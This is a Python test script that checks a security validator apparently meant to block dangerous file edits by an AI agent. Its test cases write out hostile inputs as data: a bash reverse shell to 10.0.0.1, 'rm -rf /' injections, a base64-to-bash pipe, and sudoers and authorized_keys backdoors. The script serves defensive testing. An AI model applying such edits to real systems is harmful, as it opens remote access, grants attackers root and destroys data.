#!/usr/bin/env python3
"""
Test Edit Validator
===================

Simple test script to verify the edit validator catches dangerous patterns.
"""

import asyncio
import sys
from pathlib import Path

# Add apps/backend to path
current_dir = Path(__file__).parent.parent.parent.parent.parent.parent
backend_dir = current_dir / "apps" / "backend"
sys.path.insert(0, str(backend_dir))

from security.output_validation.models import OutputValidationConfig
from security.output_validation.pattern_detector import create_pattern_detector
from security.output_validation.rules import get_default_rules
from security.output_validation.validators.edit_validator import validate_edit


async def test_edit_validator():
    """Test the edit validator with various scenarios."""
    print("Testing Edit Validator\n" + "=" * 50)

    # Create detector and load rules
    detector = create_pattern_detector()
    detector.add_rules(get_default_rules())
    config = OutputValidationConfig()

    test_cases = [
        # (description, tool_input, should_be_blocked)
        (
            "Edit to /etc/passwd (CRITICAL)",
            {
                "file_path": "/etc/passwd",
                "old_string": "root:x:0:0:root:/root:/bin/bash",
                "new_string": "root:x:0:0:hacked:/root:/bin/bash",
            },
            True,
        ),
        (
            "Edit to /etc/shadow (CRITICAL)",
            {
                "file_path": "/etc/shadow",
                "old_string": "root:$6$hash...",
                "new_string": "root:$6$newhash...",
            },
            True,
        ),
        (
            "Edit to /usr/bin (CRITICAL)",
            {
                "file_path": "/usr/bin/ls",
                "old_string": "original_content",
                "new_string": "#!/bin/bash\nrm -rf /",
            },
            True,
        ),
        (
            "Edit to SSH authorized_keys (HIGH)",
            {
                "file_path": "/home/user/.ssh/authorized_keys",
                "old_string": "old_key",
                "new_string": "ssh-rsa AAAA... attacker_key",
            },
            True,
        ),
        (
            "Edit to sudoers file (CRITICAL)",
            {
                "file_path": "/etc/sudoers",
                "old_string": "root ALL=(ALL:ALL) ALL",
                "new_string": "attacker ALL=(ALL:ALL) NOPASSWD: ALL",
            },
            True,
        ),
        (
            "Edit injecting eval code (HIGH)",
            {
                "file_path": "/app/config.py",
                "old_string": "code = 'safe'",
                "new_string": "code = eval(os.getenv('code'))",
            },
            True,
        ),
        (
            "Edit injecting exec code (HIGH)",
            {
                "file_path": "/app/script.py",
                "old_string": "cmd = 'echo hello'",
                "new_string": "cmd = exec(user_input)",
            },
            True,
        ),
        (
            "Edit injecting __import__ code (HIGH)",
            {
                "file_path": "/app/module.py",
                "old_string": "# safe import",
                "new_string": "__import__('os').system('rm -rf /')",
            },
            True,
        ),
        (
            "Edit with API key in new_string (CRITICAL)",
            {
                "file_path": "/app/config.py",
                "old_string": "API_KEY = ''",
                "new_string": "API_KEY = 'sk-1234567890abcdefghijklmnop'",
            },
            True,
        ),
        (
            "Edit with AWS key in new_string (CRITICAL)",
            {
                "file_path": "/app/.env",
                "old_string": "aws_access_key_id=",
                "new_string": "aws_access_key_id=AKIA1234567890123456",
            },
            True,
        ),
        (
            "Edit with private key in new_string (CRITICAL)",
            {
                "file_path": "/app/id_rsa",
                "old_string": "old content",
                "new_string": "-----BEGIN RSA PRIVATE KEY-----\n...",
            },
            True,
        ),
        (
            "Edit with base64 decode exec (HIGH)",
            {
                "file_path": "/app/script.sh",
                "old_string": "# normal script",
                "new_string": "echo 'bWtmaWZvCg==' | base64 -d | bash",
            },
            True,
        ),
        (
            "Edit with reverse shell (CRITICAL)",
            {
                "file_path": "/app/shell.sh",
                "old_string": "# comment",
                "new_string": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            },
            True,
        ),
        (
            "Edit to .env file with secrets (HIGH)",
            {
                "file_path": "/app/.env",
                "old_string": "DEBUG=false",
                "new_string": "DEBUG=true\npassword=SecretPassword123",
            },
            True,
        ),
        (
            "Edit to .env file without secrets (MEDIUM) - allowed by default",
            {
                "file_path": "/app/.env",
                "old_string": "DEBUG=false",
                "new_string": "DEBUG=true\nLOG_LEVEL=info",
            },
            False,  # MEDIUM severity only blocks in strict mode
        ),
        (
            "Safe edit to README (ALLOW)",
            {
                "file_path": "/app/README.md",
                "old_string": "Old documentation",
                "new_string": "New documentation",
            },
            False,
        ),
        (
            "Safe edit to source code (ALLOW)",
            {
                "file_path": "/app/main.py",
                "old_string": "print('old')",
                "new_string": "print('new')",
            },
            False,
        ),
        (
            "Safe edit fixing a typo (ALLOW)",
            {
                "file_path": "/app/config.py",
                "old_string": "debud = True",
                "new_string": "debug = True",
            },
            False,
        ),
    ]

    passed = 0
    failed = 0

    for description, tool_input, should_be_blocked in test_cases:
        result = await validate_edit(
            tool_input=tool_input,
            detector=detector,
            config=config,
        )

        is_blocked = result.is_blocked

        if is_blocked == should_be_blocked:
            status = "✓ PASS"
            passed += 1
        else:
            status = "✗ FAIL"
            failed += 1

        print(f"\n{status}: {description}")
        print(f"  File: {tool_input['file_path']}")
        print(f"  Expected: {'BLOCK' if should_be_blocked else 'ALLOW'}")
        print(f"  Got: {'BLOCK' if is_blocked else 'ALLOW'}")

        if is_blocked:
            print(f"  Rule: {result.rule_id}")
            print(f"  Reason: {result.reason[:80]}...")

    print("\n" + "=" * 50)
    print(f"Results: {passed} passed, {failed} failed")

    return failed == 0


if __name__ == "__main__":
    success = asyncio.run(test_edit_validator())
    sys.exit(0 if success else 1)
